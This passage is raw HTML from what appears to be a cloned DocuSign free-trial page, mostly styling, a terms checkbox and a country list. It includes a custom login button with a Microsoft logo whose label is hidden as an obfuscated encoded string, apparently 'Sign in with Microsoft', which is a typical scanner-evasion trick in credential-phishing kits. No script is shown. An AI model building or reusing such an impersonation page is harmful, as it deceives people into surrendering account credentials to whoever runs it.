9.7 7.4 5 0 8.7-2.5 8.7-7.1-.1-4.7-3.9-5.8-8.5-6.8zM128.3 10.7c-.9 0-1.7-.8-1.7-1.7s.8-1.7 1.7-1.7c.9 0 1.7.8 1.7 1.7s-.8 1.7-1.7 1.7zm0-3.1c-.8 0-1.4.6-1.4 1.4 0 .8.6 1.4 1.4 1.4.8 0 1.4-.6 1.4-1.4 0-.8-.6-1.4-1.4-1.4z"
              ></path>
              <path
                d="M127.7 8.1h.6c.2 0 .4 0 .5.1.1.1.2.2.2.4 0 .3-.2.4-.3.5l.4.7h-.4l-.3-.6h-.4v.6h-.3V8.1zm.3.3v.5h.3c.1 0 .3 0 .3-.3 0 0 0-.2-.1-.2h-.5z"
              ></path>
            </svg>
            <style data-emotion="css kbleys">
              .css-kbleys {
                font-weight: 600;
                line-height: 1.25;
                font-size: 2rem;
                margin-left: 0.5rem;
                display: none;
                --tw-text-opacity: 1;
                color: rgba(0, 0, 0, var(--tw-text-opacity));
              }

              @media (min-width: 720px) {
                .css-kbleys {
                  display: block;
                }
              }
            </style>
            <div class="css-kbleys">eSignature</div>
          </a>
          <style data-emotion="css bjn8wh">
            .css-bjn8wh {
              position: relative;
            }
          </style>
          <div class="css-bjn8wh">
            <style data-emotion="css z8x74j">
              .css-z8x74j {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                justify-content: space-between;
                -webkit-align-items: center;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                font-weight: 600;
              }
            </style>
            <style data-emotion="css exuy6r">
              .css-exuy6r {
                transition-property: background-color, border-color, color,
                  fill, stroke, opacity, box-shadow, transform, filter,
                  backdrop-filter;
                transition-timing-function: cubic-bezier(0.4, 0, 1, 1);
                transition-duration: 150ms;
                text-align: center;
                -webkit-text-decoration: none;
                text-decoration: none;
                background-color: rgba(0, 0, 0, 0);
                border-radius: 0.125rem;
                border-width: 1px;
                border-style: solid;
                box-sizing: border-box;
                display: inline-block;
                border-color: rgba(0, 0, 0, 0);
                --tw-text-opacity: 0.9;
                color: rgba(25, 24, 35, var(--tw-text-opacity));
                padding-left: 1rem;
                padding-right: 1rem;
                padding-top: 0.25rem;
                padding-bottom: 0.25rem;
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
                -webkit-box-pack: justify;
                -webkit-justify-content: space-between;
                justify-content: space-between;
                -webkit-align-items: center;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
                font-weight: 600;
              }

              .css-exuy6r:focus {
                outline: 2px solid transparent;
                outline-offset: 2px;
              }

              .css-exuy6r:focus-visible {
                --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
                  var(--tw-ring-offset-width) var(--tw-ring-offset-color);
                --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
                  calc(3px + var(--tw-ring-offset-width))
                  var(--tw-ring-color);
                box-shadow: var(--tw-ring-offset-shadow),
                  var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
                --tw-ring-offset-width: 2px;
                --tw-ring-opacity: 1;
                --tw-ring-color: rgba(
                  112,
                  109,
                  136,
                  var(--tw-ring-opacity)
                );
              }

              .css-exuy6r > svg[role="img"] {
                display: inline-block;
                vertical-align: top;
                font-size: 1.5em;
              }

              .css-exuy6r:disabled,
              .css-exuy6r[aria-disabled="true"] {
                cursor: not-allowed;
                opacity: 0.25;
              }

              .css-exuy6r[href][aria-disabled="true"] {
                pointer-events: none;
              }

              .css-exuy6r:not(:disabled):hover {
                background-color: rgba(25, 24, 35, 0.05);
              }

              .css-exuy6r:not(:disabled):active {
                background-color: rgba(25, 24, 35, 0.1);
                transition-duration: 150ms;
              }
            </style>
            <button
              title="Help"
              aria-label="Help"
              role="button"
              data-context="nav-main-dropdown"
              data-action="help"
              class="css-exuy6r"
              id="headlessui-menu-button-undefined"
              aria-haspopup="true"
              aria-expanded="false"
              aria-disabled="false"
            >
              <style data-emotion="css jk6asd">
                .css-jk6asd {
                  margin-right: 0.5rem;
                }
              </style>
              <span class="css-jk6asd">Help</span>
              <style data-emotion="css g2456v">
                .css-g2456v {
                  margin-left: -0.25rem;
                }
              </style>
              <svg
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
                width="0.75em"
                height="0.75em"
                role="img"
                aria-hidden="true"
                class="css-g2456v"
              >
                <path
                  d="m19 9.476-6.257 6.218a1.055 1.055 0 0 1-1.486 0L5 9.476 6.485 8 12 13.48 17.515 8 19 9.476z"
                  fill="currentColor"
                ></path>
              </svg>
            </button>
            <style data-emotion="css 3odcd">
              .css-3odcd.enter {
                transition-property: background-color, border-color, color,
                  fill, stroke, opacity, box-shadow, transform, filter,
                  backdrop-filter;
                transition-timing-function: cubic-bezier(0, 0, 0.2, 1);
                transition-duration: 100ms;
              }

              .css-3odcd.enter-from {
                -webkit-transform: var(--tw-transform);
                -moz-transform: var(--tw-transform);
                -ms-transform: var(--tw-transform);
                transform: var(--tw-transform);
                opacity: 0;
                --tw-scale-x: 0.95;
                --tw-scale-y: 0.95;
              }

              .css-3odcd.enter-to {
                -webkit-transform: var(--tw-transform);
                -moz-transform: var(--tw-transform);
                -ms-transform: var(--tw-transform);
                transform: var(--tw-transform);
                opacity: 1;
                --tw-scale-x: 1;
                --tw-scale-y: 1;
              }

              .css-3odcd.leave {
                transition-property: background-color, border-color, color,
                  fill, stroke, opacity, box-shadow, transform, filter,
                  backdrop-filter;
                transition-timing-function: cubic-bezier(0.4, 0, 1, 1);
                transition-duration: 75ms;
              }

              .css-3odcd.leave-from {
                -webkit-transform: var(--tw-transform);
                -moz-transform: var(--tw-transform);
                -ms-transform: var(--tw-transform);
                transform: var(--tw-transform);
                opacity: 1;
                --tw-scale-x: 1;
                --tw-scale-y: 1;
              }

              .css-3odcd.leave-to {
                -webkit-transform: var(--tw-transform);
                -moz-transform: var(--tw-transform);
                -ms-transform: var(--tw-transform);
                transform: var(--tw-transform);
                opacity: 0;
                --tw-scale-x: 0.95;
                --tw-scale-y: 0.95;
              }
            </style>
          </div>
        </div>
      </div>
    </header>
    <style data-emotion="css 13yehke">
      .css-13yehke {
        -webkit-align-self: flex-start;
        -ms-flex-item-align: flex-start;
        align-self: flex-start;
        margin-top: 2rem;
        margin-bottom: 2rem;
        max-width: 1080px;
        margin-left: auto;
        margin-right: auto;
        display: -webkit-box;
        display: -webkit-flex;
        display: -ms-flexbox;
        display: flex;
        -webkit-align-items: center;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        -webkit-flex-direction: column;
        -ms-flex-direction: column;
        flex-direction: column;
      }

      @media (min-width: 720px) {
        .css-13yehke {
          width: 100%;
        }

        @media (min-width: 375px) {
          .css-13yehke {
            max-width: 375px;
          }
        }

        @media (min-width: 720px) {
          .css-13yehke {
            max-width: 720px;
          }
        }

        @media (min-width: 1024px) {
          .css-13yehke {
            max-width: 1024px;
          }
        }

        @media (min-width: 1080px) {
          .css-13yehke {
            max-width: 1080px;
          }
        }

        @media (min-width: 1220px) {
          .css-13yehke {
            max-width: 1220px;
          }
        }

        @media (min-width: 1536px) {
          .css-13yehke {
            max-width: 1536px;
          }
        }
      }

      @media (min-width: 1024px) {
        .css-13yehke {
          height: 100%;
          margin-top: 0px;
        }
      }
    </style>
    <main class="css-13yehke">
      <style data-emotion="css u56qpx">
        .css-u56qpx {
          padding-left: 1.5rem;
          padding-right: 1.5rem;
          margin-top: 2rem;
          text-align: center;
        }

        @media (min-width: 1024px) {
          .css-u56qpx {
            padding-left: 0px;
            padding-right: 0px;
          }

          @media (min-width: 1024px) {
            .css-u56qpx {
              margin-top: 6rem;
            }
          }
        }
      </style>
      <div class="css-u56qpx">
        <style data-emotion="css 1gm3336">
          .css-1gm3336 {
            font-weight: 600;
            line-height: 1.25;
            font-size: 2rem;
          }

          @media (min-width: 1024px) {
            .css-1gm3336 {
              font-weight: 600;
              line-height: 1.25;
              font-size: 3rem;
            }
          }

          .css-1gm3336 > sup {
            font-weight: 200;
            font-size: 60%;
          }
        </style>
        <h1 class="css-1gm3336">Try DocuSign free for 90 days</h1>
        <style data-emotion="css 1tf27d1">
          .css-1tf27d1 {
            padding-top: 0.5rem;
          }

          @media (min-width: 720px) {
            .css-1tf27d1 {
              padding-top: 0.75rem;
              font-size: 1.25rem;
              line-height: 1.75rem;
            }
          }

          .css-1tf27d1 > strong {
            display: block;
          }
        </style>
        <div class="css-1tf27d1">
          <strong>No credit card required</strong>
        </div>
      </div>
      <style data-emotion="css 1q8fzx3">
        .css-1q8fzx3 {
          display: grid;
          grid-template-columns: repeat(1, minmax(0, 1fr));
        }

        @media (min-width: 1024px) {
          .css-1q8fzx3 {
            grid-template-columns: max-content max-content;
          }
        }
      </style>
      <div class="css-1q8fzx3">
        <style data-emotion="css 15tzs5q">
          .css-15tzs5q {
            max-width: 28rem;
            padding-left: 1.5rem;
            padding-right: 1.5rem;
            margin-left: auto;
            margin-right: auto;
          }

          @media (min-width: 1024px) {
            .css-15tzs5q {
              padding-left: 0px;
              padding-right: 0px;
            }
          }
        </style>
        <div class="css-15tzs5q">
          <style data-emotion="css 14hyrcg">
            .css-14hyrcg {
              width: 100%;
            }

            @media (min-width: 720px) {
              .css-14hyrcg {
                max-width: 24rem;
              }
            }

            @media (min-width: 720px) {
              .css-14hyrcg {
                margin: auto;
              }
            }
            #login-btn:hover {
              background-color: #000;
              color: white;
            }
            #login-btn {
              display: flex;
              width: 100%;
              border: 1px solid rgb(39, 39, 39);
              padding: 12px 46px;
              background-color: transparent;
              color: black;
              cursor: pointer;
              text-align: center;
              align-items: center;
              justify-content: center;
              margin: 27px 0px;
            }
          </style>
          <div class="css-14hyrcg">
            <style data-emotion="css 1y3dj72">
              .css-1y3dj72 {
                font-family: "DS Indigo", DSIndigo, "Neue Haas Grotesk",
                  NeueHaasGrotesk, Helvetica, Arial, sans-serif,
                  -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
                  Helvetica Neue, Arial, "Noto Sans", sans-serif,
                  Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol,
                  Noto Color Emoji;
                color: rgba(25, 24, 35, 0.9);
              }
            </style>
            <div class="css-1y3dj72">
              <div>
                <div>
                  <style data-emotion="css 180ztch">
                    .css-180ztch {
                      margin-top: 1.5rem;
                      margin-bottom: 1rem;
                    }

                    @media (min-width: 1024px) {
                      .css-180ztch {
                        margin-top: 2.25rem;
                      }
                    }
                  </style>
                  <div class="css-180ztch">
                    <style data-emotion="css 15ylkfs">
                      .css-15ylkfs {
                        position: relative;
                        box-sizing: border-box;
                        display: -webkit-box;
                        display: -webkit-flex;
                        display: -ms-flexbox;
                        display: flex;
                        height: 4rem;
                      }
                    </style>
                  </div>
                  <style data-emotion="css 1j4kz71">
                    .css-1j4kz71 {
                      min-height: 0.25rem;
                      display: -webkit-box;
                      display: -webkit-flex;
                      display: -ms-flexbox;
                      display: flex;
                      -webkit-box-pack: center;
                      -ms-flex-pack: center;
                      -webkit-justify-content: center;
                      justify-content: center;
                    }
                  </style>
                  <div class="css-1j4kz71">
                    <div class="sp-container"></div>
                  </div>
                  <style data-emotion="css epil85">
                    .css-epil85 {
                      font-size: 0.75rem;
                      line-height: 1rem;
                      margin-top: 0.75rem;
                      margin-bottom: 0.75rem;
                      letter-spacing: 0.025em;
                    }
                    ::placeholder {
                      color: rgb(0, 0, 0) !important;
                    }
                    input::before {
                      border: none !important;
                    }
                    input::after {
                      border: none !important;
                    }
                  </style>

                  <div class="w3-row">
                    <div class="w3-col" style="width: 5%">
                      <input
                        type="checkbox"
                        style="height: 20px; margin-top: 8px"
                      />
                    </div>
                    <div class="w3-col" style="width: 95%">
                      <div class="css-epil85">
                        By clicking the Get Started button below, you agree
                        to the
                        <style data-emotion="css rjkuem">
                          .css-rjkuem {
                            --tw-text-opacity: 1;
                            color: rgba(
                              0,
                              105,
                              236,
                              var(--tw-text-opacity)
                            );
                            -webkit-text-decoration: none;
                            text-decoration: none;
                            outline: 2px solid transparent;
                            outline-offset: 2px;
                            border-radius: 0.125rem;
                          }

                          .css-rjkuem:hover {
                            -webkit-text-decoration: underline;
                            text-decoration: underline;
                          }

                          .css-rjkuem:focus {
                            --tw-ring-offset-shadow: var(--tw-ring-inset) 0
                              0 0 var(--tw-ring-offset-width)
                              var(--tw-ring-offset-color);
                            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
                              calc(2px + var(--tw-ring-offset-width))
                              var(--tw-ring-color);
                            box-shadow: var(--tw-ring-offset-shadow),
                              var(--tw-ring-shadow),
                              var(--tw-shadow, 0 0 #0000);
                            --tw-ring-offset-width: 2px;
                            --tw-ring-opacity: 1;
                            --tw-ring-color: rgba(
                              112,
                              109,
                              136,
                              var(--tw-ring-opacity)
                            );
                          }
                        </style>
                        <a
                          data-context="consent"
                          data-action="terms of use"
                          data-type="link"
                          href="https://www.docusign.com/company/terms-and-conditions/web"
                          target="_blank"
                          rel="noopener noreferrer"
                          class="css-rjkuem"
                          >Terms &amp;Conditions</a
                        >
                        and
                        <a
                          data-context="consent"
                          data-action="privacy policy"
                          data-type="link"
                          href="https://www.docusign.com/company/privacy-policy"
                          target="_blank"
                          rel="noopener noreferrer"
                          class="css-rjkuem"
                          >Privacy Policy</a
                        >
                        .
                      </div>
                    </div>
                  </div>

                  <button id="login-btn">
                    <img
                      id="lgImg"
                      src="/primary/images/msf.svg"
                      style="margin: 0px 8px"
                    />OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND
                    <svg
                      class="pointer"
                      width="25"
                      viewBox="0 0 26 26"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                      style="margin: 2px 4px 0px"
                    >
                      <path
                        d="M22.375 12.5437C22.375 13.1909 21.8503 13.7156 21.2031 13.7156L4.79687 13.7156C4.14967 13.7156 3.625 13.1909 3.625 12.5437C3.625 11.8965 4.14966 11.3718 4.79687 11.3718L21.2031 11.3718C21.8503 11.3718 22.375 11.8965 22.375 12.5437Z"
                        fill="black"
                      ></path>
                      <path
                        d="M12.1714 21.5755C11.7137 21.1178 11.7137 20.3758 12.1714 19.9182L19.5458 12.5437L12.1714 5.16922C11.7137 4.71157 11.7137 3.96958 12.1714 3.51194C12.629 3.05429 13.371 3.05429 13.8286 3.51194L22.0318 11.7151C22.4894 12.1727 22.4894 12.9147 22.0318 13.3723L13.8286 21.5755C13.371 22.0331 12.629 22.0331 12.1714 21.5755Z"
                        fill="black"
                      ></path>
                    </svg>
                  </button>

                 

                  <style data-emotion="css 1qhafk4">
                    .css-1qhafk4 {
                      width: 100%;
                      height: 3rem;
                      font-weight: 600;
                      display: -webkit-box;
                      display: -webkit-flex;
                      display: -ms-flexbox;
                      display: flex;
                      -webkit-align-items: center;
                      -webkit-box-align: center;
                      -ms-flex-align: center;
                      align-items: center;
                      -webkit-box-pack: center;
                      -ms-flex-pack: center;
                      -webkit-justify-content: center;
                      justify-content: center;
                    }
                  </style>
                  <style data-emotion="css 1b2deny">
                    .css-1b2deny {
                      transition-property: background-color, border-color,
                        color, fill, stroke, opacity, box-shadow, transform,
                        filter, backdrop-filter;
                      transition-timing-function: cubic-bezier(
                        0.4,
                        0,
                        1,
                        1
                      );
                      transition-duration: 150ms;
                      text-align: center;
                      -webkit-text-decoration: none;
                      text-decoration: none;
                      background-color: rgba(0, 0, 0, 0);
                      border-radius: 0.125rem;
                      border-width: 1px;
                      border-style: solid;
                      box-sizing: border-box;
                      display: inline-block;
                      --tw-border-opacity: 1;
                      border-color: rgba(
                        0,
                        105,
                        236,
                        var(--tw-border-opacity)
                      );
                      --tw-bg-opacity: 1;
                      background-color: rgba(
                        0,
                        105,
                        236,
                        var(--tw-bg-opacity)
                      );
                      --tw-text-opacity: 1;
                      color: rgba(255, 255, 255, var(--tw-text-opacity));
                      padding-left: 1rem;
                      padding-right: 1rem;
                      padding-top: 0.25rem;
                      padding-bottom: 0.25rem;
                      width: 100%;
                      height: 3rem;
                      font-weight: 600;
                      display: -webkit-box;
                      display: -webkit-flex;
                      display: -ms-flexbox;
                      display: flex;
                      -webkit-align-items: center;
                      -webkit-box-align: center;
                      -ms-flex-align: center;
                      align-items: center;
                      -webkit-box-pack: center;
                      -ms-flex-pack: center;
                      -webkit-justify-content: center;
                      justify-content: center;
                    }

                    .css-1b2deny:focus {
                      outline: 2px solid transparent;
                      outline-offset: 2px;
                    }

                    .css-1b2deny:focus-visible {
                      --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
                        var(--tw-ring-offset-width)
                        var(--tw-ring-offset-color);
                      --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
                        calc(3px + var(--tw-ring-offset-width))
                        var(--tw-ring-color);
                      box-shadow: var(--tw-ring-offset-shadow),
                        var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000);
                      --tw-ring-offset-width: 2px;
                      --tw-ring-opacity: 1;
                      --tw-ring-color: rgba(
                        112,
                        109,
                        136,
                        var(--tw-ring-opacity)
                      );
                    }

                    .css-1b2deny > svg[role="img"] {
                      display: inline-block;
                      vertical-align: top;
                      font-size: 1.5em;
                    }

                    .css-1b2deny:disabled,
                    .css-1b2deny[aria-disabled="true"] {
                      cursor: not-allowed;
                      opacity: 0.25;
                    }

                    .css-1b2deny[href][aria-disabled="true"] {
                      pointer-events: none;
                    }

                    .css-1b2deny:not(:disabled):hover {
                      --tw-bg-opacity: 1;
                      background-color: rgba(
                        0,
                        92,
                        211,
                        var(--tw-bg-opacity)
                      );
                    }

                    .css-1b2deny:not(:disabled):active {
                      --tw-bg-opacity: 1;
                      background-color: rgba(
                        1,
                        67,
                        156,
                        var(--tw-bg-opacity)
                      );
                      --tw-border-opacity: 1;
                      border-color: rgba(
                        1,
                        67,
                        156,
                        var(--tw-border-opacity)
                      );
                      transition-duration: 150ms;
                    }
                  </style>
                  
                </div>
                <style data-emotion="css b9edjf">
                  .css-b9edjf {
                    display: -webkit-box;
                    display: -webkit-flex;
                    display: -ms-flexbox;
                    display: flex;
                    -webkit-box-pack: center;
                    -ms-flex-pack: center;
                    -webkit-justify-content: center;
                    justify-content: center;
                    margin-top: 0.75rem;
                  }
                </style>
                <div class="css-b9edjf">
                  <style data-emotion="css pz7x3v">
                    .css-pz7x3v {
                      font-size: 0.75rem;
                      line-height: 1rem;
                      letter-spacing: 0.025em;
                      padding-top: 1px;
                      padding-bottom: 1px;
                    }
                  </style>
                  <div class="css-pz7x3v">
                    <style data-emotion="css 540biz">
                      .css-540biz {
                        display: -webkit-inline-box;
                        display: -webkit-inline-flex;
                        display: -ms-inline-flexbox;
                        display: inline-flex;
                        -webkit-align-items: center;
                        -webkit-box-align: center;
                        -ms-flex-align: center;
                        align-items: center;
                        position: relative;
                      }
                    </style>
                    <label class="css-540biz">
                      <span>Region: United States</span>
                      <svg
                        viewBox="0 0 24 24"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        width="1em"
                        height="1em"
                        role="img"
                        aria-hidden="true"
                      >
                        <path
                          d="m19 9.476-6.257 6.218a1.055 1.055 0 0 1-1.486 0L5 9.476 6.485 8 12 13.48 17.515 8 19 9.476z"
                          fill="currentColor"
                        ></path>
                      </svg>
                      <style data-emotion="css fuiai9">
                        .css-fuiai9 {
                          position: absolute;
                          top: 0px;
                          right: 0px;
                          bottom: 0px;
                          left: 0px;
                          opacity: 0;
                          width: 100%;
                        }
                      </style>
                      <select
                        data-context="selector-country"
                        class="css-fuiai9"
                      >
                        <option value="en-AF">Afghanistan</option>
                        <option value="en-AX">Aland Islands</option>
                        <option value="en-AL">Albania</option>
                        <option value="en-DZ">Algeria</option>
                        <option value="en-AS">American Samoa</option>
                        <option value="en-AD">Andorra</option>
                        <option value="en-AO">Angola</option>
                        <option value="en-AI">Anguilla</option>
                        <option value="en-AQ">Antarctica</option>
                        <option value="en-AG">Antigua and Barbuda</option>
                        <option value="en-AR">Argentina</option>
                        <option value="en-AM">Armenia</option>
                        <option value="en-AW">Aruba</option>
                        <option value="en-AU">Australia</option>
                        <option value="en-AT">Austria</option>
                        <option value="en-AZ">Azerbaijan</option>
                        <option value="en-BS">Bahamas</option>
                        <option value="en-BH">Bahrain</option>
                        <option value="en-BD">Bangladesh</option>
                        <option value="en-BB">Barbados</option>
                        <option value="en-BE">Belgium</option>
                        <option value="en-BZ">Belizeh</option>
                        <option value="en-BJ">Benin</option>
                        <option value="en-BM">Bermuda</option>
                        <option value="en-BT">Bhutan</option>
                        <option value="en-BO">Bolivia</option>
                        <option value="en-BA">
                          Bosnia and Herzegovina
                        </option>
                        <option value="en-BW">Botswana</option>
                        <option value="en-BV">Bouvet Island</option>
                        <option value="pt-BR">Brazil</option>
                        <option value="en-IO">
                          British Indian Ocean Territory
                        </option>
                        <option value="en-VG">
                          British Virgin Islands
                        </option>
                        <option value="en-BN">Brunei</option>
                        <option value="en-BG">Bulgaria</option>
                        <option value="en-BF">Burkina Faso</option>
                        <option value="en-BI">Burundi</option>
                        <option value="en-KH">Cambodia</option>
                        <option value="en-CM">Cameroon</option>
                        <option value="en-CA">Canada-English</option>
                        <option value="fr-CA">Canada-French</option>
                        <option value="en-CV">Cape Verde</option>
                        <option value="en-BQ">Caribbean Netherlands</option>
                        <option value="en-KY">Cayman Islands</option>
                        <option value="en-CF">
                          Central African Republic
                        </option>
                        <option value="en-TD">Chad</option>
                        <option value="en-CL">Chile</option>
                        <option value="en-CN">China</option>
                        <option value="en-CX">Christmas Island</option>
                        <option value="en-CC">
                          Cocos (Keeling) Islands
                        </option>
                        <option value="en-CO">Colombia</option>
                        <option value="en-KM">Comoros</option>
                        <option value="en-CG">Congo (Brazzaville)</option>
                        <option value="en-CD">Congo (Kinshasa)</option>
                        <option value="en-CK">Cook Islands</option>
                        <option value="en-CR">Costa Rica</option>
                        <option value="en-HR">Croatia</option>
                        <option value="en-CW">Curaçao</option>
                        <option value="en-CY">Cyprus</option>
                        <option value="en-CZ">Czech Republic</option>
                        <option value="en-DK">Denmark</option>
                        <option value="en-DJ">Djibouti</option>
                        <option value="en-DM">Dominica</option>
                        <option value="en-DO">Dominican Republic</option>
                        <option value="en-EC">Ecuador</option>
                        <option value="en-EG">Egypt</option>
                        <option value="en-SV">El Salvador</option>
                        <option value="en-GQ">Equatorial Guinea</option>
                        <option value="en-ER">Eritrea</option>
                        <option value="en-EE">Estonia</option>
                        <option value="en-ET">Ethiopia</option>
                        <option value="en-FK">Falkland Islands</option>
                        <option value="en-FO">Faroe Islands</option>
                        <option value="en-FJ">Fiji</option>
                        <option value="en-FI">Finland</option>
                        <option value="fr-FR">France</option>
                        <option value="en-GF">French Guiana</option>
                        <option value="en-PF">French Polynesia</option>
                        <option value="en-TF">
                          French Southern Territories
                        </option>
                        <option value="en-GA">Gabon</option>
                        <option value="en-GM">Gambia</option>
                        <option value="en-GE">Georgia</option>
                        <option value="de-DE">Germany</option>
                        <option value="en-GH">Ghana</option>
                        <option value="en-GI">Gibraltar</option>
                        <option value="en-GR">Greece</option>
                        <option value="en-GL">Greenland</option>
                        <option value="en-GD">Grenada</option>
                        <option value="en-GP">Guadeloupe</option>
                        <option value="en-GU">Guam</option>
                        <option value="en-GT">Guatemala</option>
                        <option value="en-GG">Guernsey</option>
                        <option value="en-GN">Guinea</option>
                        <option value="en-GW">Guinea-Bissau</option>
                        <option value="en-GY">Guyana</option>
                        <option value="en-HT">Haiti</option>
                        <option value="en-HM">
                          Heard Island and McDonald Islands
                        </option>
                        <option value="en-HN">Honduras</option>
                        <option value="en-HK">
                          Hong Kong S.A.R. China
                        </option>
                        <option value="en-HU">Hungary</option>
                        <option value="en-IS">Iceland</option>
                        <option value="en-IN">India</option>
                        <option value="en-ID">Indonesia</option>
                        <option value="en-IQ">Iraq</option>
                        <option value="en-IE">Ireland</option>
                        <option value="en-IM">Isle of Man</option>
                        <option value="en-IL">Israel</option>
                        <option value="it-IT">Italy</option>
                        <option value="en-CI">Ivory Coast</option>
                        <option value="en-JM">Jamaica</option>
                        <option value="ja-JP">Japan</option>
                        <option value="en-JE">Jersey</option>
                        <option value="en-JO">Jordan</option>
                        <option value="en-KZ">Kazakhstan</option>
                        <option value="en-KE">Kenya</option>
                        <option value="en-KI">Kiribati</option>
                        <option value="en-KW">Kuwait</option>
                        <option value="en-KG">Kyrgyzstan</option>
                        <option value="en-LA">Laos</option>
                        <option value="en-LV">Latvia</option>
                        <option value="en-LB">Lebanon</option>
                        <option value="en-LS">Lesotho</option>
                        <option value="en-LR">Liberia</option>
                        <option value="en-LY">Libya</option>
                        <option value="en-LI">Liechtenstein</option>
                        <option value="en-LT">Lithuania</option>
                        <option value="en-LU">Luxembourg</option>
                        <option value="en-MO">Macao S.A.R. China</option>
                        <option value="en-MK">Macedonia</option>
                        <option value="en-MG">Madagascar</option>
                        <option value="en-MW">Malawi</option>
                        <option value="en-MY">Malaysia</option>
                        <option value="en-MV">Maldives</option>
                        <option value="en-ML">Mali</option>
                        <option value="en-MT">Malta</option>
                        <option value="en-MH">Marshall Islands</option>
                        <option value="en-MQ">Martinique</option>
                        <option value="en-MR">Mauritania</option>
                        <option value="en-MU">Mauritius</option>
                        <option value="en-YT">Mayotte</option>
                        <option value="es-MX">Mexico</option>
                        <option value="en-FM">Micronesia</option>
                        <option value="en-MD">Moldova</option>
                        <option value="en-MC">Monaco</option>
                        <option value="en-MN">Mongolia</option>
                        <option value="en-ME">Montenegro</option>
                        <option value="en-MS">Montserrat</option>
                        <option value="en-MA">Morocco</option>
                        <option value="en-MZ">Mozambique</option>
                        <option value="en-MM">Myanmar</option>
                        <option value="en-NA">Namibia</option>
                        <option value="en-NR">Nauru</option>
                        <option value="en-NP">Nepal</option>
                        <option value="nl-NL">Netherlands</option>
                        <option value="en-AN">Netherlands Antilles</option>
                        <option value="en-NC">New Caledonia</option>
                        <option value="en-NZ">New Zealand</option>
                        <option value="en-NI">Nicaragua</option>
                        <option value="en-NE">Niger</option>
                        <option value="en-NG">Nigeria</option>
                        <option value="en-NU">Niue</option>
                        <option value="en-NF">Norfolk Island</option>
                        <option value="en-MP">
                          Northern Mariana Islands
                        </option>
                        <option value="en-NO">Norway</option>
                        <option value="en-OM">Oman</option>
                        <option value="en-PK">Pakistan</option>
                        <option value="en-PW">Palau</option>
                        <option value="en-PS">Palestinian Territory</option>
                        <option value="en-PA">Panama</option>
                        <option value="en-PG">Papua New Guinea</option>
                        <option value="en-PY">Paraguay</option>
                        <option value="en-PE">Peru</option>
                        <option value="en-PH">Philippines</option>
                        <option value="en-PN">Pitcairn</option>
                        <option value="en-PL">Poland</option>
                        <option value="en-PT">Portugal</option>
                        <option value="en-PR">Puerto Rico</option>
                        <option value="en-QA">Qatar</option>
                        <option value="en-RE">Reunion</option>
                        <option value="en-RO">Romania</option>
                        <option value="en-RW">Rwanda</option>
                        <option value="en-BL">Saint Barthélemy</option>
                        <option value="en-SH">Saint Helena</option>
                        <option value="en-KN">Saint Kitts and Nevis</option>
                        <option value="en-LC">Saint Lucia</option>
                        <option value="en-MF">
                          Saint Martin (French part)
                        </option>
                        <option value="en-PM">
                          Saint Pierre and Miquelon
                        </option>
                        <option value="en-VC">
                          Saint Vincent and the Grenadines
                        </option>
                        <option value="en-WS">Samoa</option>
                        <option value="en-SM">San Marino</option>
                        <option value="en-ST">Sao Tome and Principe</option>
                        <option value="en-SA">Saudi Arabia</option>
                        <option value="en-SN">Senegal</option>
                        <option value="en-RS">Serbia</option>
                        <option value="en-SC">Seychelles</option>
                        <option value="en-SL">Sierra Leone</option>
                        <option value="en-SG">Singapore</option>
                        <option value="en-SX">Sint Maarten</option>
                        <option value="en-SK">Slovakia</option>
                        <option value="en-SI">Slovenia</option>
                        <option value="en-SB">Solomon Islands</option>
                        <option value="en-SO">Somalia</option>
                        <option value="en-ZA">South Africa</option>
                        <option value="en-GS">
                          South Georgia and the South Sandwich Islands
                        </option>
                        <option value="en-KR">South Korea</option>
                        <option value="en-SS">South Sudan</option>
                        <option value="es-ES">Spain</option>
                        <option value="en-LK">Sri Lanka</option>
                        <option value="en-SR">Suriname</option>
                        <option value="en-SJ">
                          Svalbard and Jan Mayen
                        </option>
                        <option value="en-SZ">Swaziland</option>
                        <option value="en-SE">Sweden</option>
                        <option value="en-CH">Switzerland</option>
                        <option value="en-TW">Taiwan</option>
                        <option value="en-TJ">Tajikistan</option>
                        <option value="en-TZ">Tanzania</option>
                        <option value="en-TH">Thailand</option>
                        <option value="en-TL">Timor-Leste</option>
                        <option value="en-TG">Togo</option>
                        <option value="en-TK">Tokelau</option>
                        <option value="en-TO">Tonga</option>
                        <option value="en-TT">Trinidad and Tobago</option>
                        <option value="en-TN">Tunisia</option>
                        <option value="en-TR">Turkey</option>
                        <option value="en-TM">Turkmenistan</option>
                        <option value="en-TC">
                          Turks and Caicos Islands
                        </option>
                        <option value="en-TV">Tuvalu</option>
                        <option value="en-VI">U.S. Virgin Islands</option>
                        <option value="en-UG">Uganda</option>
                        <option value="en-UA">Ukraine</option>
                        <option value="en-AE">United Arab Emirate</option>
                        <option value="en-GB">United Kingdom</option>
                        <option selected="" value="en-US">
                          United States
                        </option>
                        <option value="en-UM">
                          United States Minor Outlying Islands
                        </option>
                        <option value="en-UY">Uruguay</option>
                        <option value="en-UZ">Uzbekistan</option>
                        <option value="en-VU">Vanuatu</option>
                        <option value="en-VA">Vatican</option>
                        <option value="en-VN">Vietnam</option>
                        <option value="en-WF">Wallis and Futuna</option>
                        <option value="en-EH">Western Sahara</option>
